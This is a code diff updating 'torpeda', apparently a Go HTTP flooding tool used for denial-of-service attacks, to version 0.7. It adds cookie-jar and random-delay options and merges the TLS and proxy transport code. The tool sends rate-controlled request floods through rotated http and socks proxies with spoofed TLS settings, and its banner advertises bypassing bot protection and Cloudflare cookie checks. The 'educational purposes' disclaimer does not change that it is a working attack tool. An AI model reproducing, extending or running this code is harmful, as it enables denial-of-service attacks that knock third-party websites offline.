@@ -20,9 +20,11 @@ import (
 
 	http "github.com/bogdanfinn/fhttp"
 	"github.com/bogdanfinn/fhttp/http2"
+	"github.com/bogdanfinn/fhttp/cookiejar"
 	tls "github.com/bogdanfinn/utls"
 	"github.com/panjf2000/ants/v2"
 	"h12.io/socks"
+	
 
 	"github.com/shirou/gopsutil/cpu"
 	"github.com/shirou/gopsutil/mem"
@@ -71,7 +73,6 @@ var cipherSuites = []uint16{
 }
 
 var supportedGroups = []tls.CurveID{
-	25497,
 	tls.X25519,
 	tls.CurveP256,
 	tls.CurveP384,
@@ -93,6 +94,8 @@ var (
 	parsed   bool
 	cf       bool
 	usehttp1 bool
+	useJar	 bool
+	useDelay 	 bool
 
 	cookies         = ""
 	timeoutCount    int
@@ -188,8 +191,8 @@ func main() {
 	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
 	if len(os.Args) < 7 {
 		fmt.Print("\033[H\033[2J")
-		fmt.Println(`	[flooder - golang] torpeda v0.7 // Updated: 16.11.2024 // Made with love :D
-	Developers to method: @rapidreset aka mitigations / @benshii
+		fmt.Println(`	[flooder - golang] torpeda v0.7 // Updated: 17.11.2024 // Made with love :D
+	Developers to method: @rapidreset aka mitigations / helped @benshii
 	WARNING: The method was done for educational purposes, all responsibility is on you!
 	Annoucement: @devtorpeda / @rapidreset
 	Features: bypass BFM, many options, support %RAND% in target, support rate like 4.7, support http/socks proxy
@@ -211,6 +214,8 @@ func main() {
 	--cf - For sites who has protection based on check cf_clearence cookies
 	--http1 - For sites who have only http/1.1 
 	--multipath "/login@/register@" - max 5 paths like "/page1@/page2@/page3@/page4@/page5"
+	--jar - beta test
+	--delay - beta test
 	 `)
 	return
 }
@@ -286,6 +291,10 @@ func main() {
 			if i+1 < len(os.Args) {
 				paths = strings.Split(os.Args[i+1], "@")
 			}
+		case "--delay":
+			useDelay = true
+		case "--jar":
+			useJar = true
 		}
 	}
 
@@ -303,14 +312,14 @@ func main() {
 	defer p.Release()
 
 	 for i := 0; i < threads; i++ {
- 	  wg.Add(1)
+ 
   	  p.Submit(func() {
      	   for _, proxy := range proxies {
       	      go start(proxy)
     	    }
  	   })
 	}
-	wg.Wait()
+
 	time.Sleep(time.Duration(duration) * time.Second)
 }
 
@@ -322,10 +331,6 @@ func detectProxyType(proxy string) string {
 	} else if strings.HasPrefix(proxy, "https://") {
 		return "https"
 	} else if strings.HasPrefix(proxy, "http://") {
-		return "http"
-	}
-
-	if strings.Contains(proxy, ":") {
 		return "http"
 	}
 
@@ -378,6 +383,13 @@ func Cloudflarecookie() string {
 		randstr(20),
 	)
 	return cookieValue
+}
+
+func delayrandom() {
+	if useDelay {
+		sleepTime := time.Duration(rand.Intn(3)+1) * time.Second
+		time.Sleep(sleepTime)
+	}
 }
 
 func parseCookies(resp *http.Response) {
@@ -595,73 +607,49 @@ func start(proxy string) {
 
 	proxyClean := strings.TrimPrefix(proxy, proxyType+"://")
 
-	var transport *http.Transport
-
 	parsedURL, err := url.Parse(target)
 	if err != nil {
 		fmt.Println("Error parsing target URL:", err)
 		os.Exit(1)
 	}
 
-	if usehttp1 {
-		tlsConfig := &tls.Config{
-			ServerName:               parsedURL.Host,
-			MinVersion:               supportedVersions[len(supportedVersions)-1],
-			MaxVersion:               supportedVersions[0],
-			CurvePreferences:         supportedGroups,
-			CipherSuites:             cipherSuites,
-			ClientSessionCache:       tls.NewLRUClientSessionCache(0),
-			NextProtos:               []string{"http/1.1"},
-			PreferServerCipherSuites: false,
-			InsecureSkipVerify:       true,
-		}
+	tlsConfig := &tls.Config{
+		ServerName:               parsedURL.Host,
+		MinVersion:               supportedVersions[len(supportedVersions)-1],
+		MaxVersion:               supportedVersions[0],
+		CurvePreferences:         supportedGroups,
+		CipherSuites:             cipherSuites,
+		ClientSessionCache:       tls.NewLRUClientSessionCache(0),
+		PreferServerCipherSuites: false,
+		InsecureSkipVerify:       true,
+	}
 
-		if proxyType == "socks5" || proxyType == "socks4" {
-			dialSocksProxy := socks.Dial(fmt.Sprintf("%s://%s", proxyType, proxyClean))
-			transport = &http.Transport{
-				Dial:            dialSocksProxy,
-				TLSClientConfig: tlsConfig,
-			}
-		} else {
-			proxyURL, err := url.Parse(proxy)
-			if err != nil {
-				return
-			}
-			transport = &http.Transport{
-				Proxy:           http.ProxyURL(proxyURL),
-				TLSClientConfig: tlsConfig,
-			}
+	if usehttp1 {
+		tlsConfig.NextProtos = []string{"http/1.1"}
+	} else {
+		tlsConfig.NextProtos = []string{"h2", "http/1.1"}
+	}
+
+	var transport *http.Transport
+	if proxyType == "socks5" || proxyType == "socks4" {
+		dialSocksProxy := socks.Dial(fmt.Sprintf("%s://%s", proxyType, proxyClean))
+		transport = &http.Transport{
+			Dial:            dialSocksProxy,
+			TLSClientConfig: tlsConfig,
 		}
 	} else {
-		tlsConfig := &tls.Config{
-			ServerName:               parsedURL.Host,
-			MinVersion:               supportedVersions[len(supportedVersions)-1],
-			MaxVersion:               supportedVersions[0],
-			CurvePreferences:         supportedGroups,
-			CipherSuites:             cipherSuites,
-			ClientSessionCache:       tls.NewLRUClientSessionCache(0),
-			NextProtos:               []string{"h2", "http/1.1"},
-			PreferServerCipherSuites: false,
-			InsecureSkipVerify:       true,
+		proxyURL, err := url.Parse(proxy)
+		if err != nil {
+			fmt.Println("Error parsing proxy URL:", err)
+			return
 		}
-
-		if proxyType == "socks5" || proxyType == "socks4" {
-			dialSocksProxy := socks.Dial(fmt.Sprintf("%s://%s", proxyType, proxyClean))
-			transport = &http.Transport{
-				Dial:            dialSocksProxy,
-				TLSClientConfig: tlsConfig,
-			}
-		} else {
-			proxyURL, err := url.Parse(proxy)
-			if err != nil {
-				return
-			}
-			transport = &http.Transport{
-				Proxy:           http.ProxyURL(proxyURL),
-				TLSClientConfig: tlsConfig,
-			}
+		transport = &http.Transport{
+			Proxy:           http.ProxyURL(proxyURL),
+			TLSClientConfig: tlsConfig,
 		}
+	}
 
+	if !usehttp1 {
 		transport_http2, err := http2.ConfigureTransports(transport)
 		if err != nil {
 			return
@@ -676,9 +664,22 @@ func start(proxy string) {
 		transport.H2transport = transport_http2
 	}
 
+	var jar http.CookieJar
+	if useJar {
+		jar, err = cookiejar.New(nil)
+		if err != nil {
+			fmt.Printf("failed to create cookie jar: %v\n", err)
+			return
+		}
+	}
+
 	client := &http.Client{
 		Timeout:   time.Second * 5,
 		Transport: transport,
+	}
+
+	if useJar {
+		client.Jar = jar
 	}
 
 	if redirect {
@@ -723,9 +724,6 @@ func start(proxy string) {
 		ResponseBody(resp)
 	}
 
-	// ratePattern := createRatePattern(rps)
-	// fmt.Printf("length: %d\nratePattern: %v\n", len(ratePattern), ratePattern)
-
 	atomic.AddInt32(&connections, 1)
 
 	rateLimit := time.NewTicker(time.Second / time.Duration(rps))
@@ -733,7 +731,8 @@ func start(proxy string) {
 
 	for {
 		select {
-		case <-rateLimit:
+		case <-rateLimit.C:
+			delayrandom()
 			resp, err := client.Do(req)
 			if err != nil {
 				updateErrorCounters(err)
@@ -743,6 +742,7 @@ func start(proxy string) {
 			updateStatusMap(resp.StatusCode)
 		}
 	}
+	time.Sleep(time.Second)
 }
 
 func updateErrorCounters(err error) {
@@ -805,7 +805,7 @@ func printStatuses() {
 ⠀⠜⢠⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣦⠄⣠⠀
 ⠠⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿
 ⠀⠛⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⢳⣾⣿⣿⣿⣿⣿⣿⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿`)
-		fmt.Println("> Version: v0.6")
+		fmt.Println("> Version: v0.7")
 		fmt.Println("> Request Method:", reqmethod)
 		fmt.Println("> Target:", target)
 		fmt.Println("> Time:", duration)
